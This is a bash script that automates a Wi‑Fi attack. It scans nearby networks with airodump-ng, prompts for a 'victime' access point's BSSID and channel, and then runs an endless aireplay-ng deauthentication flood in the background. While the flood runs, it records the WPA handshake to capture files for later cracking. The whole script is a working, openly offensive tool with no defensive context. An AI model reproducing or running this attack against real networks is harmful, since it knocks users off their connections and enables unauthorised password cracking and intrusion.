#!/bin/bash

if [ $# -ne 1 ] ; then
	echo " Argument denied ( Name OF wlan ... ) "
	exit 1
fi

red='\033[0;31m'
white='\033[0;0m'
gras='\033[0;10m'

wlan=$1

test=0
echo -e "${gras}${red}"
select var in " Display ESSID VICTIME ( CTRL-C for EXIT ... ) " " INFO ( BSSID , CHANNEL ) " " Execute Attack Operation ... " " QUIT " ; do

	case $REPLY in

		1) clear
		echo "" ; echo -e "${white} Copier Bssid & Channel's Victime " ; echo "" ; echo " Wait ... " ; sleep 3
		sudo airodump-ng $wlan
		clear ;;

		2) read -p " Victime's BSSID : " bssid
		read -p " Victime's Channel : " ch
		test=1
		clear ;;


		3) clear ; if [ $test -ne 1 ] ; then
			echo " Setp 2 ... "
		else
			echo "" ; echo -e "${red} Wait for Capture Hanchacke ... ${white}" ; sleep 2

			nohup sudo aireplay-ng --deauth 0 -a $bssid $wlan &

			sudo airodump-ng -w hack -c $ch --bssid $bssid $wlan
		fi ;;

		4) break ;;

		*) echo -e "${red} TRY AGAIN ... ${white}" ;;
	esac
done

clear

echo ""
echo -e "${red} HANDCHACKE : "
ls -l *.cap | tail -1
echo ""


